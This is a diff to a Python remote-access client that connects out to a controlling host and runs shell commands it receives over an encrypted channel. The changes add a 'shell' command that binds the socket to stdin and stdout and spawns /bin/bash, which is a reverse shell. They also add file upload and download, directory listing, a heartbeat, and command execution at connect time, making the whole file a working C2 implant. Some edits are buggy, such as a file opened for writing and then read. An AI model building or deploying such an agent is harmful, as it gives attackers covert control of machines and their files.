@@ -1,8 +1,4 @@
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import serialization, padding, hashes
-from cryptography.hazmat.primitives.asymmetric import dh
-from cryptography.hazmat.primitives.kdf.hkdf import HKDF
-from cryptography.hazmat.backends import default_backend
+from crypt import ClientPyEncryption
 from utils import NO_OUTPUT_SIGNAL
 import subprocess
 import argparse
@@ -11,6 +7,7 @@ import select
 import socket
 import json
 import time
+import pty
 import os
 
 logging.basicConfig(level=None)
@@ -18,6 +15,42 @@ logging.basicConfig(level=None)
 # Constants
 SENDING_FILE = b"sendingfile"
 GETTING_FILE = b"gettingfile"
+
+def stat_to_dict(stat_obj):
+    return {
+        'st_mode': stat_obj.st_mode,
+        'st_ino': stat_obj.st_ino,
+        'st_dev': stat_obj.st_dev,
+        'st_nlink': stat_obj.st_nlink,
+        'st_uid': stat_obj.st_uid,
+        'st_gid': stat_obj.st_gid,
+        'st_size': stat_obj.st_size,
+        'st_atime': stat_obj.st_atime,
+        'st_mtime': stat_obj.st_mtime,
+        'st_ctime': stat_obj.st_ctime
+    }
+
+def scandir_to_dict(path=None):
+    if not path: path = None
+    entries = os.scandir(path)
+    entries_list = []
+
+    for entry in entries:
+        entry_dict = {
+            'name': entry.name,
+            'path': entry.path,
+            'inode': entry.inode(),
+            'is_dir': entry.is_dir(),
+            'is_file': entry.is_file(),
+            'is_symlink': entry.is_symlink(),
+        }
+        try:
+            entry_dict['stat'] = stat_to_dict(entry.stat())
+        except Exception as e:
+            entry_dict['stat'] = str(e)  # Store any error messages
+        entries_list.append(entry_dict)
+    entries_list = sorted(entries_list, key=lambda x: x['name'])
+    return json.dumps((entries_list)).encode()
 
 class Shell:
     def __init__(self):
@@ -45,64 +78,6 @@ class Shell:
                     if self.end_marker.encode() in chunk:
                         return out[:-len(self.end_marker)], err
 
-class Encryption():
-    def __init__(self):
-        self.parameters = None
-        self.derived_key = None
-
-    def get_params(self, s):
-        parameters_json = s.recv(1024)
-        parameters_dict = json.loads(parameters_json.decode())
-        p = parameters_dict['p']
-        g = parameters_dict['g']
-        return dh.DHParameterNumbers(p, g).parameters(default_backend())
-    
-    def get_derived_key(self, parameters, socket):
-        client_private_key = parameters.generate_private_key()
-
-        client_public_key_pem = client_private_key.public_key().public_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PublicFormat.SubjectPublicKeyInfo
-        )
-        socket.send(client_public_key_pem)
-
-        server_public_key_pem = socket.recv(1024)
-        server_public_key = serialization.load_pem_public_key(server_public_key_pem)
-        shared_key = client_private_key.exchange(server_public_key)
-        return HKDF(
-                algorithm=hashes.SHA256(),
-                length=32,
-                salt=None,
-                info=b'handshake data',
-            ).derive(shared_key)
-
-    def encrypt_message(self, data, derived_key):
-            iv = os.urandom(12)
-            cipher = Cipher(algorithms.AES(derived_key), modes.GCM(iv), backend=default_backend())
-            encryptor = cipher.encryptor()
-            padder = padding.PKCS7(128).padder()
-            padded_message = padder.update(data) + padder.finalize()
-            ciphertext = encryptor.update(padded_message) + encryptor.finalize()
-            tag = encryptor.tag
-            message = iv + ciphertext + tag
-            message_length = len(message)
-            return message_length, message
-
-    def decrypt_message(self, data, derived_key):
-        iv = data[:12]  # GCM uses a 12-byte IV
-        ciphertext = data[12:-16]  # assuming a 16-byte tag
-        tag = data[-16:]
-
-        # Create an AES Cipher context with the derived key and the received IV
-        cipher = Cipher(algorithms.AES(derived_key), modes.GCM(iv, tag), backend=default_backend())
-        decryptor = cipher.decryptor()
-
-        # Decrypt the ciphertext and remove the padding
-        decrypted_message = decryptor.update(ciphertext) + decryptor.finalize()
-        unpadder = padding.PKCS7(128).unpadder()
-        return unpadder.update(decrypted_message) + unpadder.finalize()
-
-
 class NetManager:
     def __init__(self, host, port):
         self.host = host
@@ -115,7 +90,9 @@ class NetManager:
                 continue
             break
         self.shell = Shell()
-        self.enc = Encryption()
+        data = self.socket.recv(1024)
+        self.socket.sendall(self.execute_command(data))
+        self.crypto = ClientPyEncryption()
 
     def connect_to_host(self):
         """Establishes a connection to the host."""
@@ -126,14 +103,12 @@ class NetManager:
     def receive_file(self, filename):
         """Receives a file from the socket and writes it to the local system."""
         with open(filename, "wb") as f:
-            self.socket.sendall(b"0")
-            while (data := self.socket.recv(1024)):
-                f.write(data)
+            self.send_response(f.read())
 
     def send_file(self, filename):
         """Reads a file from the local system and sends it through the socket."""
         with open(filename, "rb") as f:
-            self.send_response(f.read(), len(f.read()))
+            self.send_response(f.read())
 
     def change_directory(self, cmd, folder):
         try:
@@ -142,57 +117,87 @@ class NetManager:
         except FileNotFoundError:
             stdout_value = f"error: {folder} not found".encode()
         finally:
-            message_length = len(stdout_value)
-            self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
-            self.socket.sendall(stdout_value)
+            self.send_response(stdout_value)
 
     def handle_file_transfers(self, data):
         """Handles file transfers based on the received data."""
-        if data.decode().split(" ")[0] == "cd":
+        params = data.decode().split(" ")
+        if params[0] == "shell":
+            stdout_value = NO_OUTPUT_SIGNAL.encode()
+            self.send_response(stdout_value)
+            # Save the old file descriptors
+            old_stdin = os.dup(0)
+            old_stdout = os.dup(1)
+            old_stderr = os.dup(2)
+            file_descriptor = self.socket.fileno()
+            # Duplicate the file descriptor for standard input, output, and error
+            os.dup2(file_descriptor, 0)  # Standard Input
+            os.dup2(file_descriptor, 1)  # Standard Output
+            os.dup2(file_descriptor, 2)  # Standard Error
+
+            # Spawn a new shell process
+            pty.spawn("/bin/bash")
+            # After the pty.spawn is done, restore the old file descriptors
+            self.socket.sendall(b"PotatoeMunchkinExit132@@")
+            os.dup2(old_stdin, 0)
+            os.dup2(old_stdout, 1)
+            os.dup2(old_stderr, 2)
+            return True
+        elif params[0] == "ls":
+            if len(params) == 2:
+                self.send_response(scandir_to_dict(params[1]))
+            elif len(params) == 1:
+                self.send_response(scandir_to_dict())
+            return True
+        elif data.decode().split(" ")[0] == "cd":
             cmd = data.decode().split(" ")[0]
             folder = data.decode().split(" ")[1]
             self.change_directory(cmd, folder)
             return True
-        if SENDING_FILE in data:
-            file = data.decode().split("sendingfile/")[1].split(" &&")[0].strip()
+        elif SENDING_FILE in data:
+            file = data.decode().split("sendingfile ")[1].strip()
             self.receive_file(file)
             return True
-        if GETTING_FILE in data:
-            file = data.decode().split("gettingfile/")[1].split(" &&")[0].strip()
+        elif GETTING_FILE in data:
+            file = data.decode().split("gettingfile ")[1].strip()
             self.send_file(file)
+            return True
+        elif params[0] == "aliv":
+            self.send_response(b"is_alive")
             return True
         return False
 
     def execute_command(self, data):
         """Executes a command and sends the response back through the socket."""
         stdout_value, stderr_value = self.shell.execute_command(data.decode("utf-8"))
-        msg = f"{stdout_value.decode()}{stderr_value.decode()}".encode()
-        self.send_response(msg, self.enc)
+        return f"{stdout_value.decode()}{stderr_value.decode()}".encode()
 
-    def send_response(self, data, encryption):
+    def send_response(self, data):
         if len(data) > 0:
-            message_length, message = encryption.encrypt_message(data, encryption.derived_key)
+            message_length, message = self.crypto.encrypt_message(data, self.crypto.derived_key)
             self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
             self.socket.sendall(message)
         else:
-            message_length, message = encryption.encrypt_message(NO_OUTPUT_SIGNAL.encode(), encryption.derived_key)
+            message_length, message = self.crypto.encrypt_message(NO_OUTPUT_SIGNAL.encode(), self.crypto.derived_key)
             self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
             self.socket.sendall(message)
 
     def netloop(self):
-        self.enc.parameters = self.enc.get_params(self.socket)
+        self.crypto.parameters = self.crypto.get_params(self.socket)
 
         while True:
-            self.enc.derived_key = self.enc.get_derived_key(self.enc.parameters, self.socket)
+            try:
+                self.crypto.derived_key = self.crypto.get_derived_key(self.crypto.parameters, self.socket)
+            except ConnectionResetError:
+                break
             data = self.socket.recv(1024)
-            # print(data)
             if not data:
                 break
-            message = self.enc.decrypt_message(data, self.enc.derived_key)
+            message = self.crypto.decrypt_message(data, self.crypto.derived_key)
             if self.handle_file_transfers(message):
                 continue
             try:
-                self.execute_command(message)
+                self.send_response(self.execute_command(message))
             except BrokenPipeError:
                 logging.error("Connection closed by the host.")
                 break
@@ -200,11 +205,14 @@ class NetManager:
 def main():
     """Main function to parse arguments and start execution."""
     parser = argparse.ArgumentParser()
-    parser.add_argument("host")
-    parser.add_argument("port", type=int)
-
+    parser.add_argument("--host")
+    parser.add_argument("--port", type=int)
+    parser.add_argument("--test", action="store_true")
     args = parser.parse_args()
-    net_manager = NetManager(args.host, 4242)
+    if args.test:
+        print("Hello world! Wasd")
+        return
+    net_manager = NetManager("localhost", 4242)
     net_manager.netloop()
 
 
